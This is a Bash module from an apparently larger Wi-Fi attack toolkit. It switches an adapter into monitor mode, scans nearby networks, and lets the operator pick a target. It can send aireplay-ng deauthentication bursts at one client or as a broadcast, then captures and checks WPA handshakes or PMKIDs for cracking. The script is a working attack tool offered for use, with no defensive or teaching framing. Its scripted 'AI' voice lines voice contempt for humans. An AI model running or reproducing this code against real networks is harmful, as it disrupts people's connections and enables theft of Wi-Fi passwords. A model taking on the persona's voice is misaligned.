#!/bin/bash

_fix_wifi_adapter() {
    local iface=$1
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Neutralizing OS power-management & network processes...${NC}" >&2

    airmon-ng check kill >/dev/null 2>&1
    iw dev "$iface" set power_save off >/dev/null 2>&1
    ip link set "$iface" up >/dev/null 2>&1
    iwconfig "$iface" txpower 20 >/dev/null 2>&1
}

_get_wifi_interface() {
    local mon_iface=$(iwconfig 2>/dev/null | grep -i "Mode:Monitor" | awk '{print $1}')

    if [ -n "$mon_iface" ]; then
        echo "$mon_iface"
        return 0
    fi

    local managed_iface=$(iwconfig 2>/dev/null | grep -E 'IEEE 802.11|wlan' | awk '{print $1}')
    if [ -n "$managed_iface" ]; then
        _fix_wifi_adapter "$managed_iface"
        airmon-ng start "$managed_iface" >/dev/null 2>&1
        mon_iface=$(iwconfig 2>/dev/null | grep -i "Mode:Monitor" | awk '{print $1}')
        if [ -z "$mon_iface" ]; then
            mon_iface="${managed_iface}mon"
        fi
        _fix_wifi_adapter "$mon_iface"
        echo "$mon_iface"
        return 0
    fi

    echo ""
    return 1
}

run_wifi_recon() {
    local current_pid=$$
    local scan_prefix="/tmp/bw_wifiscan_${current_pid}"

    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WIRELESS SPECTRUM RECONNAISSANCE MATRIX ACTIVE ]${TXT_VOID}──────────────╖${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING AIRWAVE INTERCEPTION DAEMON...${NC}"

    local iface
    iface=$(_get_wifi_interface)

    if [ -z "$iface" ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Wireless network adapter not detected on system interface.${NC}"
        sleep 1s
        echo -e "$sep_bot\n"
        ai_speak "Human input is so very... tedious."
        echo ""
        return 1
    fi

    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ i ] MONITOR INTERFACE ENGAGED:${NC} ${TXT_RED_SUPERNOVA}${iface}${NC}"
    echo -e "${TXT_VOID}║   ${TXT_RED_MAGMA}TX-Power forced: 20 dBm | Power Save: OFF${NC}"
    echo -e "${TXT_VOID}│${NC}"

    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ * ] SCANNING AIRWAVES (12s Spectrum Sweep)...${NC}"

    airodump-ng --write "$scan_prefix" --output-format csv "$iface" >/dev/null 2>&1 &
    local dump_pid=$!

    local spinner=( '▰▱▱▱▱▱▱▱▱▱' '▰▰▱▱▱▱▱▱▱▱' '▰▰▰▱▱▱▱▱▱▱' '▰▰▰▰▱▱▱▱▱▱' '▰▰▰▰▰▱▱▱▱▱' '▰▰▰▰▰▰▱▱▱▱' '▰▰▰▰▰▰▰▱▱▱' '▰▰▰▰▰▰▰▰▱▱' '▰▰▰▰▰▰▰▰▰▱' '▰▰▰▰▰▰▰▰▰▰' )
    local spin_idx=0
    for ((i=12; i>0; i--)); do
        echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] INHALING FREQUENCIES${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spinner[spin_idx]}${TXT_VOID}]${NC} ${TXT_RED_ALARM}REMAINING:${NC} ${TXT_RED_SUPERNOVA}${i}s${NC}\033[K"
        sleep 1
        ((spin_idx = (spin_idx + 1) % 10))
    done

    kill "$dump_pid" 2>/dev/null
    wait "$dump_pid" 2>/dev/null
    echo -ne "\r\033[K"

    local csv_file="${scan_prefix}-01.csv"

    if [ ! -f "$csv_file" ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Spectrum capture failed. No frequency data written.${NC}"
        echo -e "$sep_bot\n"
        return 1
    fi

    declare -A sta_counts
    local parsing_stations=0

    while IFS=, read -r col1 col2 col3 col4 col5 col6 col7; do
        col1=$(echo "$col1" | xargs)
        col6=$(echo "$col6" | xargs)

        if [[ "$col1" == "Station MAC" ]]; then
            parsing_stations=1
            continue
        fi

        if [ $parsing_stations -eq 1 ]; then
            if [[ "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$col6" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                local ap_bssid="$col6"
                sta_counts["$ap_bssid"]=$(( ${sta_counts["$ap_bssid"]:-0} + 1 ))
            fi
        fi
    done < "$csv_file"

    echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// ISOLATED WIRELESS TARGET MATRIX ]${TXT_VOID}───────────────────────────────────⢢${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}NUM  BSSID              CH   PWR   STAs  ENC      ESSID${NC}"
    echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"

    local bssids=()
    local channels=()
    local essids=()
    local idx=1

    while IFS=, read -r bssid fts lts channel speed privacy cipher auth power beacons iv lanip idlen essid key; do
        bssid=$(echo "$bssid" | xargs)
        channel=$(echo "$channel" | xargs)
        power=$(echo "$power" | xargs)
        privacy=$(echo "$privacy" | xargs)
        essid=$(echo "$essid" | xargs)

        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [ -n "$channel" ] && [[ "$channel" =~ ^[0-9]+$ ]]; then
            [ -z "$essid" ] && essid="<HIDDEN_NETWORK>"

            bssids+=("$bssid")
            channels+=("$channel")
            essids+=("$essid")

            local active_stas=${sta_counts["$bssid"]:-0}
            local formatted_stas
            if [ "$active_stas" -gt 0 ]; then
                formatted_stas=$(printf "${TXT_B_PLASMA}%02d${NC}  " "$active_stas")
            else
                formatted_stas=$(printf "${TXT_VOID}%02d${NC}  " 0)
            fi

            local formatted_num=$(printf "%02d" $idx)
            local formatted_bssid=$(printf "%-17s" "$bssid")
            local formatted_ch=$(printf "%-4s" "$channel")
            local formatted_pwr=$(printf "%-5s" "${power}dBm")
            local formatted_enc=$(printf "%-8s" "$privacy")

            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[${formatted_num}]${NC} ${TXT_RED_SUPERNOVA}${formatted_bssid}${NC} ${TXT_B_ALARM}${formatted_ch}${NC} ${TXT_RED_MAGMA}${formatted_pwr}${NC} ${formatted_stas}${TXT_RED_LASER}${formatted_enc}${NC} ${TXT_CORE}${essid}${NC}"
            ((idx++))
        fi
    done < "$csv_file"

    if [ ${#bssids[@]} -eq 0 ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ~ ] Zero wireless targets detected in local physical proximity.${NC}"
        rm -f ${scan_prefix}* 2>/dev/null
        sleep 1s
        echo -e "$sep_bot\n"
        ai_speak "You seek the key to a door that does not exist. Typical of your kind."
        echo ""
        return 0
    fi

    echo -e "${TXT_VOID}│${NC}"
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Select target index to lock synaptic drill & capture handshake:${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Target [1-${#bssids[@]}] (or press Enter to cancel): ${TXT_RED_PLASMA}"
    read -r target_choice
    echo -ne "${NC}"

    if [ -z "$target_choice" ] || ! [[ "$target_choice" =~ ^[0-9]+$ ]] || [ "$target_choice" -lt 1 ] || [ "$target_choice" -gt ${#bssids[@]} ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ * ] Target selection bypassed.${NC}"
        rm -f ${scan_prefix}* 2>/dev/null
        echo -e "$sep_bot\n"
        return 0
    fi

    local target_idx=$((target_choice - 1))
    local sel_bssid="${bssids[$target_idx]}"
    local sel_ch="${channels[$target_idx]}"
    local sel_essid="${essids[$target_idx]}"
    local capture_out="/tmp/handshake_${sel_bssid//:/}"

    echo -e "${TXT_VOID}│${NC}"
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Select Interception Strategy:${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Passive Monitoring${NC} ${TXT_DRK_RED}(Wait 90s for natural re-auth)${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[2] Active Deauthentication${NC} ${TXT_RED_MAGMA}(Inject Aireplay-ng Deauth impulses)${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Strategy [1-2] (Default: 1): ${TXT_RED_PLASMA}"
    read -r strat_choice
    echo -ne "${NC}"

    local deauth_target=""
    if [[ "$strat_choice" == "2" ]]; then
        local target_stations=()
        local parsing_stations=0

        while IFS=, read -r col1 col2 col3 col4 col5 col6 col7; do
            col1=$(echo "$col1" | xargs)
            col6=$(echo "$col6" | xargs)

            if [[ "$col1" == "Station MAC" ]]; then
                parsing_stations=1
                continue
            fi

            if [ $parsing_stations -eq 1 ]; then
                if [[ "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$col6" == "$sel_bssid" ]]; then
                    target_stations+=("$col1")
                fi
            fi
        done < "$csv_file"

        if [ ${#target_stations[@]} -gt 0 ]; then
            echo -e "${TXT_VOID}│${NC}"
            echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// SELECTIVE DEAUTH MATRIX ]${TXT_VOID}───────────────────────────────────────⢢${NC}"
            local st_idx=1
            for sta in "${target_stations[@]}"; do
                local formatted_st_num=$(printf "%02d" $st_idx)
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[${formatted_st_num}]${NC} ${TXT_RED_LASER}Target Station:${NC} ${TXT_RED_SUPERNOVA}${sta}${NC}"
                ((st_idx++))
            done
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[00] Broadcast Deauth${NC} ${TXT_DRK_RED}(Target all stations simultaneously)${NC}"
            echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"
            echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Station Index [00-$((st_idx-1))] (Default: 0): ${TXT_RED_PLASMA}"
            read -r sta_choice
            echo -ne "${NC}"

            if [[ "$sta_choice" =~ ^[1-9][0-9]*$ ]] && [ "$sta_choice" -le ${#target_stations[@]} ]; then
                deauth_target="${target_stations[$((sta_choice-1))]}"
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[ * ] TARGET LOCK STAGED FOR SPECIFIC CLIENT: ${TXT_B_ALARM}${deauth_target}${NC}"
            else
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[ * ] TARGET LOCK STAGED FOR BROADCAST DEAUTH${NC}"
            fi
        else
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] WARNING: No active stations in CSV cache. Defaulting to Broadcast.${NC}"
        fi
    fi

    rm -f ${scan_prefix}* 2>/dev/null

    iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1

    echo -e "${TXT_VOID}│${NC}"
    echo -e "${TXT_VOID}╟─${TXT_RED_PLASMA}[ * ] LOCKING SYNAPTIC DRILL ON TARGET:${NC} ${TXT_RED_SUPERNOVA}${sel_essid}${NC} ${TXT_VOID}(${TXT_B_ALARM}${sel_bssid}${TXT_VOID})${NC}"
    echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Monitoring for PMKID / WPA Handshake (90s)...${NC}"

    airodump-ng --bssid "$sel_bssid" --channel "$sel_ch" --write "$capture_out" "$iface" >/dev/null 2>&1 &
    local cap_pid=$!

    sleep 2

    if [[ "$strat_choice" == "2" ]]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_ALARM}[ * ] FIRING DEAUTH IMPULSES VIA AIREPLAY-NG (BURST 1/2)...${NC}"
        if [ -n "$deauth_target" ]; then
            aireplay-ng -0 10 -a "$sel_bssid" -c "$deauth_target" "$iface" >/dev/null 2>&1
        else
            aireplay-ng -0 10 -a "$sel_bssid" "$iface" >/dev/null 2>&1
        fi
        # Принудительная рефиксация канала после 1-го залпа (фикс сброса на ноутбуках)
        iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1

        sleep 2
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_ALARM}[ * ] FIRING DEAUTH IMPULSES VIA AIREPLAY-NG (BURST 2/2)...${NC}"
        if [ -n "$deauth_target" ]; then
            aireplay-ng -0 10 -a "$sel_bssid" -c "$deauth_target" "$iface" >/dev/null 2>&1
        else
            aireplay-ng -0 10 -a "$sel_bssid" "$iface" >/dev/null 2>&1
        fi
        # Принудительная рефиксация канала после 2-го залпа
        iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1

        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ + ] Injection cycle complete. Awaiting handshake catch...${NC}"
    fi

    for ((i=90; i>0; i--)); do
        echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] DRAIN IN PROGRESS${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}HANDSHAKE_PULL${TXT_VOID}]${NC} ${TXT_RED_ALARM}REMAINING:${NC} ${TXT_RED_SUPERNOVA}${i}s${NC}\033[K"
        sleep 1
    done

    kill "$cap_pid" 2>/dev/null
    wait "$cap_pid" 2>/dev/null
    echo -ne "\r\033[K"

    local final_cap="${capture_out}-01.cap"
    local verify_hash="/tmp/check_valid_${current_pid}.hc22000"
    local handshake_found=false

    # Метод 1: Проверка через aircrack-ng (гарантированно ловит WPA хендшейки в .cap)
    if command -v aircrack-ng >/dev/null 2>&1 && [ -f "$final_cap" ]; then
        if aircrack-ng -b "$sel_bssid" "$final_cap" 2>/dev/null | grep -qi "handshake"; then
            handshake_found=true
        fi
    fi

    # Метод 2: Проверка/конвертация через hcxpcapngtool
    if command -v hcxpcapngtool >/dev/null 2>&1 && [ -f "$final_cap" ]; then
        hcxpcapngtool -o "$verify_hash" "$final_cap" >/dev/null 2>&1
        if [ -f "$verify_hash" ] && [ -s "$verify_hash" ]; then
            handshake_found=true
        fi
    fi

    if [ "$handshake_found" = true ]; then
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] VALIDATION PASSED: EAPOL Handshake / PMKID Hash Extracted!${NC}"
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] SUCCESS: CAPTURE ARTIFACT CREATED:${NC} ${TXT_RED_SUPERNOVA}${final_cap}${NC}"
        echo -e "${TXT_VOID}║   ${TXT_RED_PLASMA}Ready for decryption via options -W / -c${NC}"
        rm -f "$verify_hash" 2>/dev/null
        sleep 1s
        echo -e "$sep_bot\n"
        ai_speak "Target neural network acquired. Data migration to primary matrix – complete."
        echo ""
    else
        echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] CAPTURE INVALID: 90s window elapsed without valid EAPOL Handshake or PMKID.${NC}"
        echo -e "${TXT_VOID}║   ${TXT_DRK_RED}No active clients authenticated during capture window.${NC}"
        rm -f "$verify_hash" 2>/dev/null
        sleep 1s
        echo -e "$sep_bot\n"
        ai_speak "The router speaks, but no biological node answered during the capture window."
        echo ""
    fi
}